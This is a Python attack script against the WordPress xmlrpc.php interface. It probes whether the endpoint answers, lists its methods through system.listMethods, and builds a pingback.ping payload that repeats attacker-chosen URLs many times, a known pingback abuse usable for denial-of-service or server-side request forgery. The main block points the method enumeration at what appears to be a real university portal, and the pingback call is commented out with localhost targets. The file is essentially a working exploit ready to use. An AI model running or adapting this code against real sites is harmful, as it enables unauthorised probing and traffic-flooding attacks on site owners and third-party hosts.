import requests
import xml.etree.ElementTree as ET

def verify_vulnerability(url) -> bool:
    # Verify if the target is vulnerable
    result = requests.get(url + "/xmlrpc.php")
    if result.status_code == 405:
        return True
    else:
        return False

def list_methods(url):
    # List all methods available
    if not verify_vulnerability(url):
        print("[-] Target is not vulnerable")
        return
    
    payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>system.listMethods</methodName>
        <params>
        </params>
    </methodCall>"""
    
    response = exploit(url, payload)
    tree = ET.fromstring(response)
    methods = []
    for method in tree.findall("params/param/value/array/data/value/string"):
        methods.append(method.text)
    return methods  
    
def exploit(url, payload):
    # Exploit the target
    if not verify_vulnerability(url):
        print("[-] Target is not vulnerable")
        return
    result = requests.post(url + "/xmlrpc.php", data=payload, headers={"Content-Type": "text/xml"})
    return result.text

def pingback_attack(url, target:list, times:int):
    # Pingback exploit
    if not verify_vulnerability(url):
        print("[-] Target is not vulnerable")
        return

    if not "pingback.ping" in list_methods(url):
        print("[-] Target is not susceptible to pingback attack")
        return

    params_string = ""
    for param in target:
        params_string += f"<param><value><string>{param}</string></value></param>"

    payload = f"""<?xml version="1.0"?>
    <methodCall>
        <methodName>pingback.ping</methodName>
        <params>
            {params_string * times}
        </params>
    </methodCall>"""
    print("[+] Sending payload")
    res = exploit(url, payload)
    print("[+] Payload sent")
    print("[+] Response:")
    print(res)

if __name__ == "__main__":
    url = "https://portal.undc.edu.pe/"
    print(list_methods(url))
    #pingback_attack(url, ["http://localhost:8000/", "http://localhost:8000/"], 2)